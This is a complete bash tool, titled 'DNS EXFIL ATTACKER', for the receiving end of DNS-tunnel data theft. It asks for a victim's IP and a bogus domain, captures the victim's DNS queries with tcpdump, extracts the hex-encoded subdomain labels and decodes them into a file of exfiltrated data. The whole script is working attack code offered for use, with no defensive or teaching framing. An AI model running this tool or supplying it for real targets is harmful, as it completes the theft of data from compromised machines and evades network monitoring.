#!/bin/bash
# Run this script with sudo privileges
echo
echo "############################################################"
echo "#####################DNS EXFIL ATTACKER#####################"
echo "############################################################"

echo
echo "Your external IP address is: " $(curl -s ipv4.icanhazip.com)

echo 
echo "Enter IP address of victim, then press ENTER: "
read victimIP

echo 
echo "Enter the bogus domain name used on the victim: "
read domain

echo
echo "Enter a name for the capture file: "
read capFile

echo
echo "Enter the interface for tcpdump to listen on (eth0, lo, etc...): "
read interface

echo "Starting tcpdump with supplied parameters..."
echo
sudo tcpdump -U -i $interface -w $capFile -s0 port 53 and host $victimIP &
sleep 3

pid=$(ps -e | pgrep tcpdump)
#echo $pid

echo
echo "Press any key to stop tcpdump and continue the script."
read choice

sleep 3
sudo kill -2 $pid

echo
echo "Extracting data from the DNS requests..."

sudo tcpdump -r $capFile -n | grep $domain | awk -F ' ' '{print $9}' | awk -F '.' '{print $1}' | uniq > encoded.txt

sleep 3

echo
echo "Reversing the encoding..."
xxd -r -p < encoded.txt > exfil_data.txt
echo
echo "Done..." 
